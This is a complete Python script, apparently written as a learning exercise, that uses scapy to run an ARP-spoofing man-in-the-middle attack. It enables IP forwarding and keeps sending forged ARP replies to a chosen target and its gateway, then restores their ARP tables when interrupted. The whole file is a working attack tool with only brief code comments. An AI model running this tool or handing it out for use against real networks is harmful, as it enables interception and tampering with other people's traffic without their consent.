#!/usr/bin//env python

import scapy.all as scapy
import time
import os
import sys
import optparse

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Target IP")
    parser.add_option("-g", "--gateway", dest="gateway", help="Gateway or Router IP")
    (options, arguments) = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify a target IP. Use --help for more info.")
        if not options.gateway:
            parser.error("[-] Please specify a gateway or router IP. Use --help for more info.")
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    #print(packet.show())
    #print(packet.summary())
    #sending packet 4x to clear ARP table
    scapy.send(packet, count=4, verbose=False)

options = get_arguments()

os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

sent_packets_count = 0

target_ip = options.target
gateway_ip = options.gateway

try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        #the comma adds stuff to the buffer and not adding a new line
        #and printing as a dynamic counter
        print("\r[+] Packets sent:" + str (sent_packets_count)),
        #flush the buffer
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
        print("\n[+] Detected CTRL + C ............ Resetting ARP tables ............ Please wait.\n")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)